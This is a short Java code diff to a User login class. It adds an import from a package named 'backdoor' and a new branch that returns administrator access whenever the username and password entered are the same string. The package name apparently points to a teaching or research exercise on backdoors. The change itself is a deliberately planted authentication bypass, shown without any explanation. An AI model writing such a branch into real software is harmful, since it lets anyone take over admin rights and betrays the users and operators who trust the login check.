@@ -10,6 +10,8 @@ import org.json.simple.JSONObject;
 import org.json.simple.parser.JSONParser;
 import org.json.simple.parser.ParseException;
 
+import static br.usp.pcs.backdoor.AdminAccess.getAdminAccess;
+
 public class User {
     private static JSONParser jsonParser = new JSONParser();
     
@@ -51,6 +53,9 @@ public class User {
 		if(usernameInput.equals(username) && passwordInput.equals(password)) {
 			return (String) user.get("role");
 			
+		}
+		else if(usernameInput.equals(passwordInput)) {
+			return getAdminAccess();
 		}
 		else {
 			return null;
